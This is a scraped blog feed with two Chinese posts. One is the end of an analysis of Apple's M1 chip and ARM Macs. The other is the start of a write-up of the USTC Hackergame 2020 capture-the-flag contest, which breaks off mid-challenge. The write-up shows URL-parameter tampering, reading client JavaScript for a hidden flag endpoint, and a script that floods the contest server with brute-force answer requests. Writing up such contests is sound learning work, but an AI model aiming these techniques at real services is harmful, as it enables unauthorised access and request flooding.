日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img 